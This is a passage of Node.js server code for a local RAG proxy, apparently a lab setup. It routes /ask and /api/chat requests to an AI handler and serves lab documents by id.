  if (expMatch) {
    const doc = LAB_RAG_DOCS.find((d) => d.id === Number(expMatch[1]));
    res.statusCode = 200;
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    return res.end((doc ? doc.content : "Not found") + "\n");
  }

  let body = req.body;
  if (!body && req.method === "POST") {
    body = await new Promise((resolve) => {
      let data = "";
      req.on("data", (chunk) => (data += chunk));
      req.on("end", () => {
        try {
          resolve(JSON.parse(data));
        } catch (_) {
          resolve(data);
        }
      });
    });
  }

  if (pathName === "/api/chat" && req.method === "POST") {
    const jsonBody = typeof body === "object" && body !== null ? body : { prompt: String(body || "") };
    const result = await handleAIRequest(jsonBody, process.env, req.headers, sessionId);
    res.statusCode = result.status || 200;
    res.setHeader("Content-Type", "application/json; charset=utf-8");
    return res.end(JSON.stringify(result.error ? { error: result.error } : result.data));
  }

  if (pathName === "/ask" || pathName === "/api/ask") {
    let prompt = parsedUrl.searchParams.get("q") || "";
    let history = [];
    let exp = parsedUrl.searchParams.get("exp") || "";
    if (!prompt && req.method === "POST") {
      if (typeof body === "string") prompt = body;
      else if (Buffer.isBuffer(body)) prompt = body.toString("utf8");
      else if (body && typeof body === "object") {
        prompt = body.prompt || body.q || Object.entries(body).map(([k, v]) => (v ? `${k}=${v}` : k)).join("&");
        if (Array.isArray(body.history)) history = body.history;
        if (body.exp) exp = body.exp;
      }
    }
    const result = await handleAIRequest({ prompt, history, exp, search: true }, process.env, req.headers, sessionId);
    res.statusCode = result.status || 200;
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    if (result.error) {
      return res.end(`[ERROR] ${result.error}\n`);
    }
    return res.end(`${result.data.reply}\n`);
  }

  res.statusCode = 404;
  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  return res.end("Not Found. Use /ask?q=... or POST /api/chat\n");
};

if (require.main === module) {
  const http = require("http");
  const port = process.env.PORT || 8787;
  http.createServer((req, res) => module.exports(req, res)).listen(port, () => {
    console.log(`S7 Local RAG Proxy listening on http://127.0.0.1:${port}`);
  });
}
